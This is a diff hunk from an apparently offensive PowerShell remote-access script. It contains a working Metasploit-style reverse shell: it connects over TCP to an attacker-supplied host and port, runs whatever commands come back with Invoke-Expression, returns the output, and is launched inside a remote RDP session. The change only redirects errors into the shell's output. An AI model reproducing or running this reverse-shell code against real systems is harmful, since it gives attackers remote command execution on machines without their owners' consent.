@@ -623,7 +623,7 @@ Write-Host "--------------------------------------------------------------------
 if ($metasploit){ Write-Host ; Write-Host "[+] Loading Metasploit Reverse Shell.." -ForegroundColor Blue ; Write-Host ; Start-Sleep -milliseconds 2000
 Write-Host "[!] Waiting until Metasploit Reverse Shell is working.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000
 $metashell = $client = New-Object System.Net.Sockets.TCPClient("$metahost",$metaport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = 
-(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
+(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
 ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 invoke-command -session $RDP[0] -scriptblock { Invoke-Expression $using:metashell ; Start-Sleep -milliseconds 2000 }}
 
